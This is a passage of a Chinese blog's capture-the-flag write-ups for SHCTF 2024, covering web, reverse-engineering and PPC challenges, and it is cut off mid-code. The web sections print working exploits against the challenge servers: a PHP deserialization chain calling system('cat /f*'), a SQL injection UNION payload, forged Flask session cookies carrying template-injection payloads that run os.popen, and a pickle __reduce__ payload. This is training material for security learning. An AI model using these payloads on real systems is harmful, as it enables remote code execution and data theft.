<span class="hljs-variable">$o</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        SH::<span class="hljs-variable">$SHCTF</span> = <span class="hljs-literal">true</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;o-&gt;<span class="hljs-title function_ invoke__">flag</span>();<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SHCTF</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$isyou</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$flag</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (SH::<span class="hljs-variable">$Web</span>) &#123;<br>            (<span class="hljs-variable language_">$this</span>-&gt;isyou)(<span class="hljs-variable language_">$this</span>-&gt;flag);<br>        &#125; <br>    &#125;<br>&#125;<br><span class="hljs-variable">$t</span> = <span class="hljs-keyword">new</span> T;<br><span class="hljs-variable">$t</span>-&gt;n = <span class="hljs-keyword">new</span> F;<br><span class="hljs-variable">$t</span>-&gt;n-&gt;o = <span class="hljs-keyword">new</span> C;<br><span class="hljs-variable">$t</span>-&gt;n-&gt;o-&gt;p=<span class="hljs-keyword">new</span> SHCTF;<br><span class="hljs-variable">$t</span>-&gt;n-&gt;o-&gt;p-&gt;isyou=<span class="hljs-string">&#x27;system&#x27;</span>;<br><span class="hljs-variable">$t</span>-&gt;n-&gt;o-&gt;p-&gt;flag=<span class="hljs-string">&#x27;cat /f*&#x27;</span>;<br><span class="hljs-variable">$exp</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$t</span>);<br><span class="hljs-variable">$exp</span> = <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$exp</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$exp</span>;<br></code></pre></td></tr></table></figure><h3 id="单身十八年的手速"><a class="markdownIt-Anchor" href="#单身十八年的手速"></a> 单身十八年的手速</h3><p>直接js定位到alert然后base64解密得到flag</p><h3 id="md5-master"><a class="markdownIt-Anchor" href="#md5-master"></a> MD5 Master</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(__file__);<br><br><span class="hljs-variable">$master</span> = <span class="hljs-string">&quot;MD5 master!&quot;</span>;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;master1&quot;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;master2&quot;</span>]))&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$master</span>.<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;master1&quot;</span>] !== <span class="hljs-variable">$master</span>.<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;master2&quot;</span>] &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$master</span>.<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;master1&quot;</span>]) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$master</span>.<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;master2&quot;</span>]))&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$master</span> . <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;master? &lt;br&gt;&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>这题一开始的思路就是对的，只是由于编码的问题导致头一天没写出来，先用fastcoll对1.txt进行hash碰撞(内容是MD5 master!)，然后用python进行读取内容，我php写的脚本就是一直不对，不知道为什么，然后拼接就可以得到flag了，最好用bp来发，hackbar会用url的编码问题</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> urllib.parse<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">read_my_file</span>(<span class="hljs-params">path</span>):<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(path, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> fh:<br>        data = fh.read()<br>    <span class="hljs-keyword">return</span> data<br><span class="hljs-comment"># 指定文件路径</span><br>file_path = <span class="hljs-string">&quot;test_msg2.txt&quot;</span><br>encoded_data = urllib.parse.quote(read_my_file(file_path))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;URL 编码后的内容: <span class="hljs-subst">&#123;encoded_data&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure><p><img src="/../../images/shctf/2024/5.png" alt="5"></p><h2 id="ai"><a class="markdownIt-Anchor" href="#ai"></a> Ai</h2><h3 id="小助手"><a class="markdownIt-Anchor" href="#小助手"></a> 小助手</h3><p><img src="/../../images/shctf/2024/3.png" alt="3"></p><h2 id="re"><a class="markdownIt-Anchor" href="#re"></a> Re</h2><h3 id="gamegame"><a class="markdownIt-Anchor" href="#gamegame"></a> gamegame</h3><p>程序简单跑一下，用ida查看一下发现flag就是数独空白下来的拼接，找个在线网站填一下数独就行</p><p><img src="/../../images/shctf/2024/10.png" alt="10"></p><h3 id="ezapk"><a class="markdownIt-Anchor" href="#ezapk"></a> ezapk</h3><p>用jeb打开定位一下，同时模拟器查看一下是什么apk</p><p><img src="/../../images/shctf/2024/7.png" alt="7"></p><p>写exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decode</span>(<span class="hljs-params">encoded_str, key</span>):<br>    decoded_bytes = base64.b64decode(encoded_str)<br>    decrypted_chars = []<br>    <span class="hljs-keyword">for</span> i, byte <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(decoded_bytes.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)):<br>        char_value = <span class="hljs-built_in">ord</span>(byte)<br>        char_value //= <span class="hljs-number">2</span><br>        char_value -= <span class="hljs-number">6</span><br>        decrypted_char = char_value ^ key[i % <span class="hljs-built_in">len</span>(key)]<br>        decrypted_chars.append(<span class="hljs-built_in">chr</span>(decrypted_char))<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join(decrypted_chars)<br>key = [<span class="hljs-number">12</span>, <span class="hljs-number">15</span>, <span class="hljs-number">25</span>, <span class="hljs-number">30</span>, <span class="hljs-number">36</span>]<br><br><span class="hljs-comment"># 加密后的字符串</span><br>encoded_str = <span class="hljs-string">&quot;woLDgMOgw7hEwoJQw7zDtsKow7TDpMOMZMOow75QxIbDnsKmw6Z4UMK0w7rCklDCrMKqwqbDtMOOw6DDsg==&quot;</span><br><span class="hljs-comment"># 执行解密</span><br>decrypted_str = decode(encoded_str, key)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Decrypted String:&quot;</span>, decrypted_str)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;SHCTF&#123;&#x27;</span>+decrypted_str+<span class="hljs-string">&quot;&#125;&quot;</span>)<br></code></pre></td></tr></table></figure><p><img src="/../../images/shctf/2024/8.png" alt="8"></p><h3 id="ezrc4"><a class="markdownIt-Anchor" href="#ezrc4"></a> ezrc4</h3><p>看main函数和一些其他加密逻辑rc4解密，跑一下脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> struct<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rc4_init</span>(<span class="hljs-params">key</span>):<br>    S = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>))<br>    j = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        j = (j + S[i] + key[i % <span class="hljs-built_in">len</span>(key)]) % <span class="hljs-number">256</span><br>        S[i], S[j] = S[j], S[i]<br>    <span class="hljs-keyword">return</span> S<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rc4_decrypt</span>(<span class="hljs-params">data, key</span>):<br>    S = rc4_init(key)<br>    i = j = <span class="hljs-number">0</span><br>    result = []<br>    <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> data:<br>        i = (i + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span><br>        j = (j + S[i]) % <span class="hljs-number">256</span><br>        S[i], S[j] = S[j], S[i]<br>        k = S[(S[i] + S[j]) % <span class="hljs-number">256</span>]<br>        result.append(char ^ k ^ <span class="hljs-number">0x66</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>(result)<br><span class="hljs-comment"># 从主函数中提取的加密标志</span><br>encrypted_flag = struct.pack(<span class="hljs-string">&#x27;&lt;QQQ&#x27;</span>, <span class="hljs-number">0x5B3C8F65423FAB21</span>, <span class="hljs-number">0x691AE7846E05170C</span>, <span class="hljs-number">0x111F7077C3</span>)<br><span class="hljs-comment"># 从sub_1200函数中提取的密钥</span><br>key = struct.pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x212179654B6E6546</span>)<br><span class="hljs-comment"># 解密</span><br>decrypted = rc4_decrypt(encrypted_flag, key)<br><span class="hljs-comment"># 提取有效的flag部分</span><br>flag = decrypted.split(<span class="hljs-string">b&#x27;&#125;&#x27;</span>)[<span class="hljs-number">0</span>] + <span class="hljs-string">b&#x27;&#125;&#x27;</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Flag:&quot;</span>, flag.decode(<span class="hljs-string">&#x27;ascii&#x27;</span>))<br></code></pre></td></tr></table></figure><h3 id="ezxor"><a class="markdownIt-Anchor" href="#ezxor"></a> ezxor</h3><p><img src="/../../images/shctf/2024/11.png" alt="11"></p><p>按逻辑进行简单的xor就行，上exp</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstring&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-type">char</span> v9[<span class="hljs-number">50</span>] = &#123;<span class="hljs-number">-61</span>, <span class="hljs-number">105</span>, <span class="hljs-number">114</span>, <span class="hljs-number">-60</span>, <span class="hljs-number">103</span>, <span class="hljs-number">74</span>, <span class="hljs-number">-24</span>, <span class="hljs-number">17</span>, <span class="hljs-number">67</span>, <span class="hljs-number">-49</span>, <span class="hljs-string">&#x27;o&#x27;</span>, <span class="hljs-string">&#x27;\0&#x27;</span>, <span class="hljs-number">-13</span>, <span class="hljs-number">68</span>, <span class="hljs-number">110</span>, <span class="hljs-number">-8</span>, <span class="hljs-number">89</span>, <span class="hljs-number">73</span>, <span class="hljs-number">-24</span>, <span class="hljs-number">78</span>, <span class="hljs-number">94</span>, <span class="hljs-number">-30</span>, <span class="hljs-number">83</span>, <span class="hljs-number">67</span>, <span class="hljs-number">-79</span>, <span class="hljs-number">92</span>&#125;; <span class="hljs-comment">// flag 加密后的值</span><br>    <span class="hljs-type">char</span> decrypted[<span class="hljs-number">50</span>] = &#123;<span class="hljs-number">0</span>&#125;; <br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">50</span>; ++j) &#123;<br>        <span class="hljs-keyword">if</span> (j % <span class="hljs-number">3</span> == <span class="hljs-number">0</span>) &#123;<br>            decrypted[j] = v9[j] ^ <span class="hljs-number">0x90</span>; <br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (j % <span class="hljs-number">3</span> == <span class="hljs-number">1</span>) &#123;<br>            decrypted[j] = v9[j] ^ <span class="hljs-number">0x21</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            decrypted[j] = v9[j] ^ <span class="hljs-number">0x31</span>; <br>        &#125;<br>    &#125;<br><br>    std::cout &lt;&lt; <span class="hljs-string">&quot;Decrypted flag: &quot;</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">50</span>; ++i) &#123;<br>        std::cout &lt;&lt; decrypted[i];<br>    &#125;<br>    std::cout &lt;&lt; std::endl;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="ppc"><a class="markdownIt-Anchor" href="#ppc"></a> PPC</h2><h3 id="绑定qq账号"><a class="markdownIt-Anchor" href="#绑定qq账号"></a> 绑定QQ账号</h3><p>在qq群绑定一下就行，然后网站出flag，记得刷新一下就行</p><h1 id="week2"><a class="markdownIt-Anchor" href="#week2"></a> week2</h1><h2 id="web-2"><a class="markdownIt-Anchor" href="#web-2"></a> web</h2><h3 id="guess_the_number"><a class="markdownIt-Anchor" href="#guess_the_number"></a> guess_the_number</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> random<br><br>first_num = <span class="hljs-number">2060849645</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">find_flag</span>():<br>    <span class="hljs-keyword">for</span> seed <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1000000</span>, <span class="hljs-number">9999999</span>):<br>        random.seed(seed)<br>        <span class="hljs-comment"># 生成 first_num，以确保我们使用的是同一个种子</span><br>        generated_first_num = random.randint(<span class="hljs-number">1000000000</span>, <span class="hljs-number">9999999999</span>)<br><br>        <span class="hljs-keyword">if</span> generated_first_num == first_num:<br>            <span class="hljs-comment"># 生成 second_num</span><br>            second_num = random.randint(<span class="hljs-number">1000000000</span>, <span class="hljs-number">9999999999</span>)<br><br>            <span class="hljs-comment"># 发送请求到 /guess</span><br>            url = <span class="hljs-string">f&quot;http://210.44.150.15:25676/guess?num=<span class="hljs-subst">&#123;second_num&#125;</span>&quot;</span><br>            response = requests.get(url)<br><br>            <span class="hljs-comment"># 打印每次请求的结果</span><br>            <span class="hljs-built_in">print</span>(<br>                <span class="hljs-string">f&#x27;Seed: <span class="hljs-subst">&#123;seed&#125;</span>, First Num: <span class="hljs-subst">&#123;generated_first_num&#125;</span>, Second Num: <span class="hljs-subst">&#123;second_num&#125;</span>, Response: <span class="hljs-subst">&#123;response.text&#125;</span>&#x27;</span>)<br><br>            <span class="hljs-comment"># 检查响应内容中是否包含 flag</span><br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;flag&#x27;</span> <span class="hljs-keyword">in</span> response.text:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;Found flag with seed <span class="hljs-subst">&#123;seed&#125;</span>: <span class="hljs-subst">&#123;response.text&#125;</span>&#x27;</span>)<br>                <span class="hljs-keyword">break</span>  <span class="hljs-comment"># 找到后退出循环</span><br><br><br>find_flag()<br><br></code></pre></td></tr></table></figure><h3 id="自助查询"><a class="markdownIt-Anchor" href="#自助查询"></a> 自助查询</h3><p>前面正常的查询最后一步有提示是注释里，查询<code> column_comment</code>得到flag</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span>&quot;) UNION SELECT column_name, column_comment FROM information_schema.columns WHERE table_name=&#x27;flag&#x27; --<br></code></pre></td></tr></table></figure><h3 id="入侵者禁入"><a class="markdownIt-Anchor" href="#入侵者禁入"></a> 入侵者禁入</h3><p>考察的session，需要利用模板注入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 flask_session_cookie_manager3.py encode -s <span class="hljs-string">&#x27;0day_joker&#x27;</span> -t <span class="hljs-string">&#x27;&#123;&quot;role&quot;:&#123;&quot;flag&quot;:&quot;&#123;&#123; 7*7 &#125;&#125;&quot;,&quot;is_admin&quot;:1&#125;&#125;&#x27;</span><br></code></pre></td></tr></table></figure><p>测试到有注入点</p><p>然后测试</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">TEMPLATE=<span class="hljs-string">&quot;&#123;\&quot;role\&quot;:&#123;\&quot;flag\&quot;:\&quot;&#123;% print(url_for.__globals__[\\&#x27;__builtins__\\&#x27;][\\&#x27;eval\\&#x27;](\\\&quot;__import__(\\\\\\&#x27;os\\\\\\&#x27;).popen(\\\\\\&#x27;ls \\/\\\\\\&#x27;).read()\\\&quot;)) %&#125;\&quot;,\&quot;is_admin\&quot;:1&#125;&#125;&quot;</span><br>python3 flask_session_cookie_manager3.py encode -s <span class="hljs-string">&#x27;0day_joker&#x27;</span> -t <span class="hljs-string">&quot;<span class="hljs-variable">$TEMPLATE</span>&quot;</span><br></code></pre></td></tr></table></figure><p>发现有flag,最后</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ TEMPLATE=<span class="hljs-string">&quot;&#123;\&quot;role\&quot;:&#123;\&quot;flag\&quot;:\&quot;&#123;% print(url_for.__globals__[\\&#x27;__builtins__\\&#x27;][\\&#x27;eval\\&#x27;](\\\&quot;__import__(\\\\\\&#x27;os\\\\\\&#x27;).popen(\\\\\\&#x27;cat \\/flag\\\\\\&#x27;).read()\\\&quot;)) %&#125;\&quot;,\&quot;is_admin\&quot;:1&#125;&#125;&quot;</span><br>python3 flask_session_cookie_manager3.py encode -s <span class="hljs-string">&#x27;0day_joker&#x27;</span> -t <span class="hljs-string">&quot;<span class="hljs-variable">$TEMPLATE</span>&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/../../images/shctf/2024/14.png" alt="14"></p><p><img src="/../../images/shctf/2024/15.png" alt="15"></p><h3 id="dickle"><a class="markdownIt-Anchor" href="#dickle"></a> dickle</h3><p>pickle序列化，简单的尝试了一下，注意环境需要用linux运行脚本，得到flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> subprocess<br><span class="hljs-keyword">import</span> base64<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Exploit</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-comment"># 使用 subprocess 来执行命令并返回其输出</span><br>        <span class="hljs-keyword">return</span> (subprocess.getoutput, (<span class="hljs-string">&#x27;cat /flag&#x27;</span>,))<br><br><span class="hljs-comment"># 序列化 Exploit 对象</span><br>payload = pickle.dumps(Exploit())<br>encoded_payload = base64.b64encode(payload).decode()<br><br><span class="hljs-built_in">print</span>(encoded_payload)<br></code></pre></td></tr></table></figure><p>得到的flag的为类似下方的，需要简单调节拼接一下内容</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">Deserialized data: [&#x27;S&#x27;, &#x27;H&#x27;, &#x27;C&#x27;, &#x27;T&#x27;, &#x27;F&#x27;,<br></code></pre></td></tr></table></figure><h3 id="登录验证"><a class="markdownIt-Anchor" href="#登录验证"></a> 登录验证</h3><p>登陆拿去cookie用jwt_tool爆破一下密钥</p><p><img src="/../../images/shctf/2024/16.png" alt="16"></p><p>前端是弱密码admin:admin，然后也把cookie改一下得到flag</p><p><img src="/../../images/shctf/2024/17.png" alt="17"></p><h3 id="md5-god复现"><a class="markdownIt-Anchor" href="#md5-god复现"></a> MD5 GOD!(复现)</h3><p>先看源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> hashlib, os, random<br><br><br>app = Flask(__name__)<br>app.config[<span class="hljs-string">&quot;SECRET_KEY&quot;</span>] = <span class="hljs-string">&quot;Th1s_is_5ecr3t_k3y&quot;</span><br>salt = os.urandom(<span class="hljs-number">16</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">md5</span>(<span class="hljs-params">data</span>):<br>    <span class="hljs-keyword">return</span> hashlib.md5(data).hexdigest().encode()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check_sign</span>(<span class="hljs-params">sign, username, msg, salt</span>):<br>    <span class="hljs-keyword">if</span> sign == md5(salt + msg + username):<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getRandom</span>(<span class="hljs-params">str_length=<span class="hljs-number">16</span></span>):<br>    random_str =<span class="hljs-string">&#x27;&#x27;</span><br>    base_str =<span class="hljs-string">&#x27;ABCDEFGHIGKLMNOPQRSTUVWXYZabcdefghigklmnopqrstuvwxyz0123456789&#x27;</span><br>    length =<span class="hljs-built_in">len</span>(base_str) -<span class="hljs-number">1</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(str_length):<br>        random_str +=base_str[random.randint(<span class="hljs-number">0</span>, length)]<br>    <span class="hljs-keyword">return</span> random_str<br><br>users = &#123;&#125;<br>sign_users = &#123;&#125;<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">if</span> session.get(<span class="hljs-string">&#x27;sign&#x27;</span>) == <span class="hljs-literal">None</span> <span class="hljs-keyword">or</span> session.get(<span class="hljs-string">&#x27;username&#x27;</span>) == <span class="hljs-literal">None</span> <span class="hljs-keyword">or</span> session.get(<span class="hljs-string">&#x27;msg&#x27;</span>) == <span class="hljs-literal">None</span>:<br>        <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&quot;/login&quot;</span>)<br>    sign = session.get(<span class="hljs-string">&#x27;sign&#x27;</span>)<br>    username = session.get(<span class="hljs-string">&#x27;username&#x27;</span>)<br>    msg = session.get(<span class="hljs-string">&#x27;msg&#x27;</span>)<br>    <span class="hljs-keyword">if</span> check_sign(sign, username, msg, salt):<br>        sign_users[username.decode()] = <span class="hljs-number">1</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;签到成功&quot;</span><br>    <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&quot;/login&quot;</span>)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/login&quot;</span>, methods=[<span class="hljs-string">&quot;GET&quot;</span>, <span class="hljs-string">&quot;POST&quot;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">login</span>():<br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&quot;POST&quot;</span>:<br>        username = request.form.get(<span class="hljs-string">&#x27;username&#x27;</span>)<br>        password = request.form.get(<span class="hljs-string">&#x27;password&#x27;</span>)<br>        <span class="hljs-comment"># print(password)</span><br>        <span class="hljs-keyword">if</span> username <span class="hljs-keyword">in</span> users <span class="hljs-keyword">and</span> users[username] == password:<br>            session[<span class="hljs-string">&quot;username&quot;</span>] = username.encode()<br>            session[<span class="hljs-string">&quot;msg&quot;</span>] = md5(salt + password.encode())<br>            session[<span class="hljs-string">&quot;sign&quot;</span>] = md5(salt + md5(salt + password.encode()) + username.encode())<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;登陆成功&quot;</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;登陆失败&quot;</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> render_template(<span 